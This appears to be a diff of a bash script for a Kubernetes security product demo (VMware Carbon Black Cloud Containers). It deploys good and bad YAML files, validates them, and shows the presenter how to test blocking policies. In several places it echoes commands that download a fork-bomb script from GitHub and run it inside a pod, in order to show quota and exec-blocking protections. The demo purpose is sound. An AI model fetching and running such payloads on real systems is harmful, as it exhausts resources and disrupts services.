@@ -33,7 +33,7 @@ if [ $? -eq 0 ]
 then
    shopt -s expand_aliases
    alias kubectl='minikube kubectl'
-   intro="For this demo, I'm on my laptop and will use minikube."
+   intro="For this demo, we will use minikube."
 fi
 
 # if microk8s exist, then define kubectl alias
@@ -42,7 +42,7 @@ if [ $? -eq 0 ]
 then
    shopt -s expand_aliases
    alias kubectl='microk8s kubectl'
-   intro="For this demo, I'm on my laptop and will use microK8s."
+   intro="For this demo, we will use microK8s."
 fi
 
 ########################
@@ -62,25 +62,20 @@ echo "Preparing demo..."
 
 rm -f good.yaml bad.yaml >/dev/null 2>&1
 
-microk8s kubectl delete deployment nodeapp >/dev/null 2>&1
-microk8s kubectl delete service nodeapp-service >/dev/null 2>&1
+kubectl delete deployment nodeapp >/dev/null 2>&1
+kubectl delete service nodeapp-service >/dev/null 2>&1
 
-microk8s kubectl delete pod log4j >/dev/null 2>&1
-microk8s kubectl delete pod nginx >/dev/null 2>&1
+kubectl delete pod log4j >/dev/null 2>&1
+kubectl delete pod nginx >/dev/null 2>&1
 
 clear
 echo "---"
-echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect Kubernetes:"
-wait
-echo " - onprem"
-wait
-echo " - in public cloud, for example Amazon, Azure, or Google cloud"
-wait
-echo " - mikikube"
-wait
-echo " - microk8s"
-wait
-echo " - and of course VMware Tanzu."
+echo -e "${RED}VMware Carbon Black Cloud Containers${NC} can protect:"
+echo -e " - K8s onprem"
+echo -e " - K8s in public cloud, for example Amazon, Azure, or Google..."
+echo -e " - mikikube"
+echo -e " - microk8s"
+echo -e " - and of course VMware Tanzu."
 
 if test -z "$intro" 
 then
@@ -95,8 +90,8 @@ wait
 
 echo ""
 echo "---"
-echo "Let's check that CBC is running in this cluster."
-echo "How to check what pods are running in the K8s cluster?"
+echo -e "Let's check that CBC is ${GREEN}running${NC} in this K8s cluster."
+echo -e "How to check what pods are running in the K8s cluster?"
 pe "kubectl get pods -A"
 
 wait
@@ -107,50 +102,63 @@ wait
 
 clear
 echo "---"
-echo "VMware CBC agent is deployed as a daemonset in each K8s cluster."
-echo "It means that on each K8s node, a CBC agent will run."
+echo -e "VMware CBC is deployed in each K8s cluster."
+echo -e "VMware CBC ${GREEN}node agent${NC} is deployed as a ${GREEN}daemonset${NC} in each K8s node."
+echo "It means that in a K8s cluster with CBC, on each K8s node, a CBC agent will run."
 echo "Daemonsets are commonly used for monitoring, networking and security solutions."
 pe "kubectl get daemonsets -n cbcontainers-dataplane"
 wait
 
 clear
-echo "---"
-echo "We would like to deploy a node.js application called nodeapp."
-echo "But before deploying it, we would like to apply a security policy."
+echo -e "---"
+echo -e "We would like to deploy a ${GREEN}node.js${NC} application called ${GREEN}nodeapp${NC}."
+echo -e "But before deploying it, we would like to apply a security policy."
 echo -e "In CBC UI, create a policy to ${RED}BLOCK deployments with no CPU/mem quotas${NC}."
-echo ""
-echo "Why a minimum quota? To be sure the pod will have enough CPU/mem to run correctly"
-echo "Why a maximum quota? To be sure the pod will not eat all CPU/mem, because of a bug or a cryptominer virus or someone playing Pacman..."
+echo -e ""
+echo -e "Why a ${RED}minimum${NC} quota?"
+p "To be sure the pod will have enough CPU/mem to run correctly."
+echo -e "Why a ${RED}maximum${NC} quota?"
+p "To be sure the pod will not eat all CPU/mem, because of a bug or a cryptominer virus or someone playing Pacman..."
 
 wait
-echo ""
+clear
+echo -e "---"
 echo -e "We have prepared 2 deployment files, the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
 wget https://raw.githubusercontent.com/slist/K8sConfigs/main/good/deployment.yaml >/dev/null  2>&1
 mv deployment.yaml good.yaml 2>/dev/null
 wget https://raw.githubusercontent.com/slist/K8sConfigs/main/bad/deployment.yaml >/dev/null  2>&1
 mv deployment.yaml bad.yaml 2>/dev/null
 pe "ls *.yaml"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo -e "Let's do a diff betwwen the ${GREEN}GOOD${NC} and the ${RED}BAD${NC} deployment files."
 pe "meld good.yaml bad.yaml &"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo -e "Let's try to deploy the ${RED}BAD${NC} deployment file."
 pe "kubectl apply -f bad.yaml"
+
+#Hack:
+kubectl delete service nodeapp-service >/dev/null 2>&1
 
 wait
 echo ""
 echo -e "Deployment of ${RED}BAD${NC} deployment file has failed."
 echo "Check logs in K8s violations."
 wait
+
+clear
+echo ""
 echo -e "Now, Let's try to deploy the ${GREEN}GOOD${NC} deployment file."
 pe "kubectl apply -f good.yaml"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo "How to check if the app is running, and on which port is it listening?"
 pe "kubectl get all"
 
@@ -158,19 +166,23 @@ wait
 echo ""
 echo "So, how to check if the app is running?"
 pe "firefox http://127.0.0.1:30333 &"
-
 wait
-echo ""
-echo "As a developper, how can I validate my YAML file to deploy the image?"
+
+clear
+echo "---"
+echo -e "As a developper, how can I ${GREEN}validate${NC} my YAML file to deploy the image?"
+echo -e "As a developper, I would like do it ${GREEN}manually${NC} or automate the validation in my ${GREEN}CICD pipeline${NC}."
+echo -e "Let's validate the ${GREEN}GOOD${NC} deployment file"
 pe "cbctl k8s-object validate -f good.yaml"
 
 wait
-echo ""
+echo "---"
 echo -e "So, what was wrong with the ${RED}BAD${NC} deployment file?"
 pe "cbctl k8s-object validate -f bad.yaml"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo "Let's list all pods:"
 pe "kubectl get pods"
 
@@ -184,18 +196,22 @@ echo -e "${RED}chmod +x fork-bomb.sh${NC}"
 echo -e "${RED}./fork-bomb.sh${NC}"
 echo -e "Luckily we have a ${GREEN}CPU quota${NC}"
 pe "kubectl exec -it ${firstpod} -- /bin/bash"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo -e "Modify CBC K8s to ${RED}BLOCK --- COMMAND / Exec to container---${NC}"
-
 wait
 echo ""
-echo -e "Let's open a shell in the pod, and try to fake the download of a malware ${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
+echo -e "Let's open a shell in the pod, and try to download a malware"
+echo -e "${RED}wget https://raw.githubusercontent.com/slist/security-demo/master/fork-bomb.sh${NC}"
+echo -e "${RED}chmod +x fork-bomb.sh${NC}"
+echo -e "${RED}./fork-bomb.sh${NC}"
 pe "kubectl exec -it ${firstpod} -- /bin/bash"
-
 wait
-echo ""
+
+clear
+echo "---"
 echo -e "Modify CBC K8s to ${RED}BLOCK --- CONTAINER IMAGES / Critical vulnerabilities ---${NC}"
 echo -e "Create an ${GREEN}exception${NC} if needed"
 
